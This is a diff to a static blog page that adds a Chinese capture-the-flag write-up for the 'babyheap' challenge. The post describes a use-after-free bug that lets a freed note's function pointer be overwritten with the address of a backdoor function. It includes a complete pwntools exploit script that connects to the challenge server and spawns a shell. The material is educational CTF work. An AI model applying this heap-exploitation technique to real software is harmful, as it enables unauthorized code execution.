@@ -172,7 +172,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">22</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -200,6 +200,105 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://whoamiuu.github.io/2025/12/04/2025-12-07-babyheap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Whoamiuu's Blogs">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2025/12/04/2025-12-07-babyheap/" class="post-title-link" itemprop="url">CTF题解: babyheap</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-12-04 09:33:10" itemprop="dateCreated datePublished" datetime="2025-12-04T09:33:10+08:00">2025-12-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-02-03 21:48:36" itemprop="dateModified" datetime="2026-02-03T21:48:36+08:00">2026-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p><img src="/images/babyheap/checksec.png" alt="checksec">检查发现无pie，并且程序中有后门函数magic，通过反编译发现存在UAF漏洞，可以控制函数指针跳转到magic函数得到shell，具体如下</p>
+<p><img src="/images/babyheap/disassemble.png" alt="disassemble"></p>
+<p>在add_note里，用户可以控制分配大小，并且前面分配16字节用于存储指针print_note_content。</p>
+<p><img src="/images/babyheap/free.png" alt="free"></p>
+<p>（图一）</p>
+<p><img src="/images/babyheap/pointer.png" alt="pointer"></p>
+<p>（图二）</p>
+<p>del_note这里（图一），free了之前分配的块，但是指针依然指向之前申请的堆块，于是我们可以覆盖这处堆块为magic地址，再用print_note里调用指针（图二），通过指针跳转到magic获得shell。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./attachment&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;154.94.237.159&#x27;</span>,<span class="number">34278</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无PIE，后门函数 magic()的固定地址</span></span><br><span class="line">MAGIC = <span class="number">0x400c4b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) 准备两个 note（它们的 note_struct 都是 malloc(0x10)，加上后面的malloc(0x20)（content_buf）</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)  <span class="comment"># index 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>)  <span class="comment"># index 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 依次释放：先释放 index 0，再释放 index 1</span></span><br><span class="line"><span class="comment">#    这样 tcache[0x20] 的顶端是 index 1 的 note_struct</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) 新增一个 note：第一次 malloc(0x10)（新 note_struct）会拿走 index 1 的旧结构，</span></span><br><span class="line"><span class="comment">#    接着 malloc(0x10)（content_buf）会拿走 index 0 的旧结构（我们要覆盖的结构）</span></span><br><span class="line">payload = p64(MAGIC) + p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>, payload)  <span class="comment"># 这里的 content 指针将指向 index 0 的旧 note_struct，完成函数指针覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4) 触发 UAF：调用 notelist[0]-&gt;print_func()，实际跳转到 magic()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
